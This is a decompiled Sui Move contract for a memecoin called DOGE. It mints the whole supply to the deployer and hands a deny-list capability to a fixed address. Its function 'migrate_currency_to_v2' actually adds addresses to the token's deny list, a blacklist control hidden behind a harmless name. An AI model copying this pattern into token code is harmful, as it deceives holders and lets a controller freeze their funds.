module 0x43152d8beb734de83ae08855f23fe48db7809ca457ebaa37f518df47e818fe31::doge {
    struct DOGE has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<DOGE>, arg1: 0x2::coin::Coin<DOGE>) {
        0x2::coin::burn<DOGE>(arg0, arg1);
    }

    fun init(arg0: DOGE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<DOGE>(arg0, 9, b"DOGE", b"Department of Government Efficiency on Sui", b"The United States of America is currently sitting on $35 trillion USD", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://dd.dexscreener.com/ds-data/tokens/sui/0xd4c7ae4e56c25f151650b3f761077105f5af12f13f7997c5a58aba96aa1b63c8::doge::doge.png?size=xl&key=f2481f")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<DOGE>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<DOGE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<DOGE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<DOGE>>(v1, @0x8d1ef527f6db448b9a08c5cc0fffc24a0b0c8cd8c170750085bb5c1b7a5b22f9);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<DOGE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<DOGE>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<DOGE>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<DOGE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

